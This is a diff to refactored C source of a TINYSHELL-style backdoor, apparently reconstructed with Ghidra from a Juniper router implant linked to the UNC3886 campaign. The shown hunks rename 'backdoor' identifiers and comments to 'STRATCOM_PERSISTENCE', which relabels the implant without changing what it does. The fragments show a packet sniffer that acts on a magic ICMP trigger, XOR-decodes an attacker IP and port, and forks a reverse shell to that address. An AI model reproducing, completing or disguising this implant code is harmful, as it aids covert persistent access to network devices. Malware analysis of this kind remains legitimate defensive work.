@@ -9,7 +9,7 @@
  * TINYSHELL IRAD Variant - Refactored C/C++ Source Code
  * 
  * Semantic refactoring from Ghidra decompiled pseudocode.
- * Original binary: Juniper Router Backdoor (UNC3886 Campaign)
+ * Original binary: Juniper Router STRATCOM_PERSISTENCE (UNC3886 Campaign)
  * 
  */
 
@@ -1190,10 +1190,10 @@ void start_passive_listener(void) {
 }
 
 /* ============================================================================
- * ACTIVE BACKDOOR (REVERSE SHELL)
+ * ACTIVE STRATCOM_PERSISTENCE (REVERSE SHELL)
  * ============================================================================ */
 
-void start_active_backdoor(const char *target_ip, uint16_t target_port) {
+void start_active_STRATCOM_PERSISTENCE(const char *target_ip, uint16_t target_port) {
     int sockfd;
     struct sockaddr_in server_addr;
     struct hostent *host;
@@ -1345,7 +1345,7 @@ void irad_pcap_sniffer(const char *interface_name) {
         if (memcmp(magic_payload, MAGIC_ACTIVATE, 16) == 0) {
             
             if (trigger_mode == 1 || trigger_mode == 2) {
-                /* Active backdoor mode */
+                /* Active STRATCOM_PERSISTENCE mode */
                 uint8_t ip_bytes[4];
                 ip_bytes[0] = icmp_hdr->target_ip_raw[0] ^ XOR_CIPHER_KEY;
                 ip_bytes[1] = icmp_hdr->target_ip_raw[1] ^ XOR_CIPHER_KEY;
@@ -1368,7 +1368,7 @@ void irad_pcap_sniffer(const char *interface_name) {
                 if (target_port > 0 && strlen(target_ip) > 6 && trigger_mode == 1) {
                     pid_t child = fork();
                     if (child == 0) {
-                        start_active_backdoor(target_ip, (uint16_t)target_port);
+                        start_active_STRATCOM_PERSISTENCE(target_ip, (uint16_t)target_port);
                         exit(0);
                     }
                 }
